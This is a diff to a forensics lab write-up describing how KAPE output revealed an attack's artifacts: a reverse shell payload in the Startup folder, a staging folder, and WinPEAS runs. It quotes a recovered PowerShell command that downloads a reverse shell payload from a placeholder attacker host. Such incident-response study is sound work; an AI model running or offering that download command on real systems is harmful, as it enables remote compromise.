@@ -66,6 +66,7 @@ KAPE processed the evidence and produced multiple Excel sheets (CSV/XLSX) contai
 
 ## FINDINGS — TRACING THE ATTACKER
 Through this analysis, I found clear artifacts of the attack:
+
 - Persistence:
   - Located the reverse shell payload copied to the Windows startup folder.
     Example:
@@ -73,8 +74,10 @@ Through this analysis, I found clear artifacts of the attack:
     C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.pyzw
     ```
   - Verified timestamps (Created, Modified, Accessed) showing exactly when persistence was established.
+
 - Temp staging folder:
   - Found the `Temp` directory created by the attacker under `C:\Users\Public\Documents\Temp`.
+
 - Command line evidence in Event Logs:
   - Found PowerShell and cmd commands in the Security/PowerShell logs.
   - Notably recovered the command that downloaded the payload:
@@ -82,6 +85,7 @@ Through this analysis, I found clear artifacts of the attack:
     powershell -Command "Invoke-WebRequest -Uri http://<attacker_IP>/powershell_reverse.pyzw -OutFile C:\Users\Public\Documents\powershell_reverse.pyzw"
     ```
   - This revealed the attacker’s IP address: `<attacker_IP>`.
+
 - Other footprints:
   - Evidence of the WinPEAS enumeration binary being executed.
   - Logs showing browser launches and other activity matching the attacker’s session.
@@ -93,6 +97,7 @@ Based on the parsed timestamps from the MFT, registry, and event logs, I reconst
 - When the initial reverse shell was executed.
 - When the persistence payload was copied to the startup folder.
 - When WinPEAS was run to look for privilege escalation.
+
 This provided a clear chronological picture of the attack.
 
 ---
@@ -113,5 +118,3 @@ This provided a clear chronological picture of the attack.
 > 
 > This project was performed strictly for educational and ethical purposes in a controlled lab environment.
 > Always ensure you have explicit authorization before performing any form of forensic analysis or incident response on systems.
-
----
